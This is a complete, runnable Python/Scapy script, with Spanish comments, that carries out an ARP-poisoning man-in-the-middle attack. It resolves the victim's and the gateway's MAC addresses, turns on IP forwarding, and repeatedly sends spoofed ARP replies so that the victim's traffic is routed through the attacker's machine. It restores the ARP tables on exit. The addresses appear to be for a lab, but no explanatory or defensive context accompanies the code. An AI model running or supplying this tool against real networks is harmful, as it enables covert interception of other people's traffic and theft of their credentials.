import os
import sys
import time
from scapy.all import ARP, Ether, sendp, srp, conf
 
# ── Configuracion ──────────────────────────────────────────────
IFACE        = "ens3"
ATTACKER_IP  = "10.6.82.23"
ATTACKER_MAC = "50:76:9b:00:05:00"
VICTIM_IP    = "10.6.82.22"
GATEWAY_IP   = "10.6.82.1"
INTERVAL     = 1.5
# ──────────────────────────────────────────────────────────────
 
conf.verb = 0
 
 
def get_mac(ip):
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(req, iface=IFACE, timeout=3, retry=3, verbose=False)
    if not ans:
        print("[!] No se pudo resolver la MAC de {}".format(ip))
        sys.exit(1)
    return ans[0][1].hwsrc
 
 
def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Le dice a la victima: "yo soy el gateway"
    pkt1 = Ether(dst=victim_mac, src=ATTACKER_MAC) / ARP(
        op=2,
        hwsrc=ATTACKER_MAC,
        psrc=gateway_ip,
        hwdst=victim_mac,
        pdst=victim_ip
    )
    # Le dice al gateway: "yo soy la victima"
    pkt2 = Ether(dst=gateway_mac, src=ATTACKER_MAC) / ARP(
        op=2,
        hwsrc=ATTACKER_MAC,
        psrc=victim_ip,
        hwdst=gateway_mac,
        pdst=gateway_ip
    )
    sendp(pkt1, iface=IFACE, verbose=False)
    sendp(pkt2, iface=IFACE, verbose=False)
 
 
def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[*] Restaurando tablas ARP...")
    for _ in range(6):
        sendp(
            Ether(dst=victim_mac) / ARP(
                op=2,
                hwsrc=gateway_mac,
                psrc=gateway_ip,
                hwdst=victim_mac,
                pdst=victim_ip
            ),
            iface=IFACE, verbose=False
        )
        sendp(
            Ether(dst=gateway_mac) / ARP(
                op=2,
                hwsrc=victim_mac,
                psrc=victim_ip,
                hwdst=gateway_mac,
                pdst=gateway_ip
            ),
            iface=IFACE, verbose=False
        )
        time.sleep(0.4)
    print("[*] Tablas ARP restauradas correctamente.")
 
 
def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[*] IP forwarding activado.")
 
 
def disable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print("[*] IP forwarding desactivado.")
 
 
def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta como root: sudo python3 arp_mitm.py")
        sys.exit(1)
 
    print("[*] Resolviendo MACs...")
    victim_mac  = get_mac(VICTIM_IP)
    gateway_mac = get_mac(GATEWAY_IP)
 
    print("[+] Victima  : {} --> {}".format(VICTIM_IP, victim_mac))
    print("[+] Gateway  : {} --> {}".format(GATEWAY_IP, gateway_mac))
    print("[+] Atacante : {} --> {}".format(ATTACKER_IP, ATTACKER_MAC))
 
    enable_ip_forward()
    print("[*] Envenenamiento ARP iniciado. Ctrl+C para detener.\n")
 
    count = 0
    try:
        while True:
            poison(VICTIM_IP, victim_mac, GATEWAY_IP, gateway_mac)
            count += 2
            sys.stdout.write("\r[+] Paquetes ARP enviados: {}".format(count))
            sys.stdout.flush()
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        restore(VICTIM_IP, victim_mac, GATEWAY_IP, gateway_mac)
        disable_ip_forward()
        print("[*] Ataque detenido.")
 
 
if __name__ == "__main__":
    main()
